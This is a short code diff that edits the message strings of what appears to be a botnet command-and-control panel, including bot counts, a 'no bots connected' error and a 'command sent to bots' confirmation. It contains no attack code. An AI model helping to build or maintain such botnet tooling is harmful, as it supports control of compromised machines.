@@ -42,9 +42,9 @@ help
 ]
 
 
-BotCount = "{blue} {bots} {white}"
+BotCount = "Total: {total}\n\r---------\n\r{blue}{bots}\r"
 NoBotsConnectedError = "{blue}No bots connected :(\r"
-CommandSent = "Command sent to {bots} bots"
+CommandSent = "Command sent to {bots} bots\r"
 
 UnknownCommandError = "{blue}Unknown command{white}"
 InvalidCommandSyntaxError = "{blue}{syntax}\r\nExample:\r\n{example}\r"
